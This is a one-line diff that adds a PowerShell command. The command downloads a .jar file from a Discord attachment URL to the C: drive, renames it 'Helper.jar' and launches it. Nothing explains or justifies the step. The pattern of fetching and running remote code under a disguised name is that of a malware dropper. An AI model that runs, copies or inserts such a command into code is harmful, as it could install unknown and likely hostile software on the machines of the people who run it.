@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1226898573040287857/1228353448701984949/1.jar?ex=662fb0cb&is=662e5f4b&hm=2163bac6981dd10fa4531382882075c799067574cb597a6b90f23aed9053268d&" -OutFile "C:\1.jar"; Rename-Item -Path "C:\1.jar" -NewName "Helper.jar"; Start-Process -FilePath "C:\Helper.jar"
